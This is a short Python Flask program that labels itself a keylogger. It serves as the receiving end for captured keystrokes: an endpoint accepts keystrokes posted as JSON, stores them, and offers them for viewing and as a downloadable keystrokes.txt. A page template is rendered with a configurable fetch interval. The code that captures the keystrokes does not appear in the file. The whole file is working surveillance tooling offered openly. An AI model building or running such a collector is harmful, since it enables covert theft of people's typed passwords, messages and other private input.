from flask import Flask, request, Response, render_template
import threading
import argparse

# Initialize Flask app for browser interface
app = Flask(__name__)
keystrokes = []

# Parse CLI arguments
parser = argparse.ArgumentParser(
    description="Keylogger with adjustable keystroke send interval."
)
parser.add_argument(
    "-t",
    "--time",
    type=int,
    default=1000,
    help="Time interval (in milliseconds) to fetch keystrokes",
)
parser.add_argument(
    "-p",
    "--port",
    type=int,
    default=5000,
    help="Port of the server (default: 5000)",
)
args = parser.parse_args()


@app.route("/")
def index():
    return render_template("index.html", time=args.time)


@app.route("/keystrokes")
def get_keystrokes():
    return "".join(keystrokes)


@app.route("/download")
def download():
    filepath = "keystrokes.txt"
    with open(filepath, "w") as f:
        f.write("".join(keystrokes))
    return Response(
        "".join(keystrokes),
        mimetype="text/plain",
        headers={"Content-Disposition": "attachment;filename=keystrokes.txt"},
    )


# Flask route to log keystrokes (server endpoint)
@app.route("/log", methods=["POST"])
def log_keystroke():
    data = request.json
    if "keystroke" in data:
        print(f"Received: {data['keystroke']}")
        keystrokes.append(data["keystroke"])
    return "OK"


# Start the Flask app in a separate thread
def start_flask_app():
    app.run(port=args.port)


if __name__ == "__main__":
    # Start Flask server
    flask_thread = threading.Thread(target=start_flask_app)
    flask_thread.daemon = True
    flask_thread.start()
    flask_thread.join()
